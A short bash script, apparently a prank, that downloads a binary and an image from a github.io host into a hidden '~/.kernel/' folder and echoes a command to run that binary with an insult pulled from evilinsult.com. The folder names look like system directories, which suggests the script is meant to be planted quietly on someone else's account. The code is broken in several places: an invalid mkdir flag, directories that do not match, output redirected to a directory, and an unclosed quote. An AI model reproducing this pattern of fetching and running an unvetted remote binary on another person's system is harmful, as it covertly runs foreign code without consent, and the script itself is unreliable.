#!/bin/bash
# Desc: xcowsay insulte
mkdir -f ~/.linux
curl https://Waz0x.github.io/bin/xcowsay/bin > ~/.kernel/
curl https://Waz0x.github.io/bin/cow_med.png > ~/.kernel/
echo "cd ~/.linux;./bin --image cow_med.png "$(curl https://evilinsult.com/generate_insult.php\?lang\=fr\&amp\;type\=raw -s)";cd &